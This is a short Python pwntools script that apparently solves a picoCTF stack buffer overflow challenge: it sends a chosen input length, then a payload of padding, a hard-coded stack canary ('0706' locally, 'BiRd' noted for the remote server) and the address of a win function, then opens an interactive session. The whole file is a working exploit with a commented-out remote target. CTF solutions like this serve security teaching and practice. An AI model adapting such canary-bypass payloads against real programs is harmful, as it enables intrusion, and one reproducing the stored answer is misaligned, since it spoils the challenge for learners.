from pwn import *
p = process('./vuln')
# p = remote("saturn.picoctf.net", 51926)
elf = ELF('./vuln')
# gdb.attach(p)

p.recvuntil("> ")
length = "88"
p.sendline(length)


p.recvuntil("Input> ")
addr_win = 0x08049336
canary = "0706" # "BiRd"				# example local - "0706"
payload = "A" * 0x40 + canary + "A" * 0x10 + p32(addr_win)
p.sendline(payload)

p.interactive()
